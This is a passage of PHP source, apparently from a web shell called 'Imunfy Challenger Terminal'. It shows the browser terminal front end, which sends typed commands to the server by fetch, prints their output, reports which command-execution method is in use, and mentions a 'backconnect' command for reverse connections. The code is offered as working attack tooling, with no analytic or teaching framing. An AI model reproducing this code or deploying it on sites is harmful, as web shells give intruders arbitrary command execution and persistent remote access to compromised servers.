<?php elseif (isset($_GET['terminal']) && $terminal_enabled): ?><?php $terminal = new TerminalSession($path); $term_dir = $terminal->getWorkDir(); $term_methods = $terminal->getExecutor()->getAvailableMethods(); $best_method = !empty($term_methods) ? $term_methods[0]['name'] : 'none'; $term_output = isset($_SESSION['terminal_last_output']) ? $_SESSION['terminal_last_output'] : ''; ?><div class="tb"><div class="bc"><span class="cr">Terminal</span></div><div class="tb-inf"><?php echo htmlspecialchars($term_dir); ?></div></div><?php if($flash): ?><div class="fl fl-<?php echo($flash['type']==='ok')?'ok':'error'; ?>"><?php echo htmlspecialchars($flash['msg']); ?></div><?php endif; ?><div class="fp"><div class="terminal-container"><div class="term-header"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="term-title">Terminal v1.0 - <?php echo htmlspecialchars($term_dir); ?></span></div><div class="term-output" id="termOutput"><pre>Welcome to Imunfy Challenger Terminal
Type 'help' for available commands
Current working directory: <?php echo htmlspecialchars($term_dir); ?>
<span class="prompt">$</span> <span style="color:var(--term-text)"></span></pre></div><div class="term-method"><span>Available: <?php echo count($term_methods); ?> methods</span><span>Best: <span style="color:var(--accent)"><?php echo htmlspecialchars($best_method); ?></span></span></div><form method="post" id="termForm" class="term-prompt" onsubmit="return false;"><input type="hidden" name="terminal_action" value="run"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><span>$</span><input type="text" name="terminal_command" id="termInput" class="term-input" placeholder="Enter command... (type 'backconnect' for help)" autocomplete="off" autofocus></form></div></div><script>(function(){const termOutput=document.getElementById('termOutput');const termInput=document.getElementById('termInput');const termForm=document.getElementById('termForm');let history=[];let historyIndex=-1;let currentPath='<?php echo htmlspecialchars($term_dir); ?>';termOutput.scrollTop=termOutput.scrollHeight;termInput.addEventListener('keydown',function(e){if(e.key==='ArrowUp'){e.preventDefault();if(historyIndex>0){historyIndex--;termInput.value=history[historyIndex];}else if(history.length>0&&historyIndex===-1){historyIndex=history.length-1;termInput.value=history[historyIndex];}}else if(e.key==='ArrowDown'){e.preventDefault();if(historyIndex<history.length-1){historyIndex++;termInput.value=history[historyIndex];}else{historyIndex=history.length;termInput.value='';}}else if(e.key==='Enter'){e.preventDefault();submitCommand();}});function submitCommand(){const command=termInput.value.trim();if(!command){updatePrompt();return;}if(history[history.length-1]!==command){history.push(command);}historyIndex=history.length;const currentContent=termOutput.innerHTML;termOutput.innerHTML=currentContent+'<span class="prompt">$</span> '+escapeHtml(command)+'<br>';termInput.value='';termInput.disabled=true;const formData=new FormData();formData.append('terminal_action','run');formData.append('terminal_command',command);formData.append('current_path',currentPath);fetch(window.location.href,{method:'POST',body:formData,headers:{'X-Requested-With':'XMLHttpRequest'}}).then(response=>response.json()).then(data=>{termInput.disabled=false;termInput.focus();if(data.output){if(data.output==='__CLEAR__'){termOutput.innerHTML='<pre><span class="prompt">$</span> </pre>';}else{const lines=data.output.split('\n');let outputHtml='';lines.forEach(line=>{outputHtml+=escapeHtml(line)+'<br>';});const currentContent=termOutput.innerHTML;const cleanContent=currentContent.replace(/<span class="prompt">\$<\/span> <br>$/,'');termOutput.innerHTML=cleanContent+outputHtml;if(data.method){termOutput.innerHTML+='<span class="method-info">[using: '+escapeHtml(data.method)+']</span><br>';}}}if(data.path){currentPath=data.path;document.querySelector('.tb-inf').textContent=data.path;}termOutput.innerHTML+='<span class="prompt">$</span> ';termOutput.scrollTop=termOutput.scrollHeight;}).catch(error=>{termInput.disabled=false;termInput.focus();termOutput.innerHTML+='<span style="color:var(--err)">Error: '+error+'</span><br>';termOutput.innerHTML+='<span class="prompt">$</span> ';termOutput.scrollTop=termOutput.scrollHeight;});}function updatePrompt(){termOutput.innerHTML+='<span class="prompt">$</span> ';termOutput.scrollTop=termOutput.scrollHeight;}function escapeHtml(str){return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;');}termInput.focus();termForm.addEventListener('submit',function(e){e.preventDefault();submitCommand();});})();</script><?php else: ?>
